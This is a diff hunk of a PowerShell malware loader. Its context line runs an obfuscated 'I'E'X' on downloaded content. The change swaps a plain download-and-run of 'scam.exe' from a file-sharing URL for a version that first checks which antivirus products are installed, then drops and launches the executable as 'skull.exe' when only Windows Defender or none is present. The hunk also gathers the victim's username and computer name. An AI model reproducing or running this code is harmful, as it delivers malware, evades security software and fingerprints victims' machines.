@@ -71,8 +71,15 @@ Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 
 
-$file = "$temp\main.exe"; if (-not (Test-Path $file)) { Invoke-WebRequest "https://anonsharing.com/file/4f095b99c1c9cec6/scam.exe" -OutFile $file }
-Start-Process -FilePath "$file"
+$temp = "$temp\skull.exe"; 
+$av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
+if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
+    if (-not (Test-Path $temp)) { 
+        Invoke-WebRequest "https://anonsharing.com/file/4f095b99c1c9cec6/scam.exe" -OutFile $temp 
+    } 
+    Start-Process $temp 
+}
+
 
 $u = ("u$env:username" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
 $c = ("c$env:computername" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
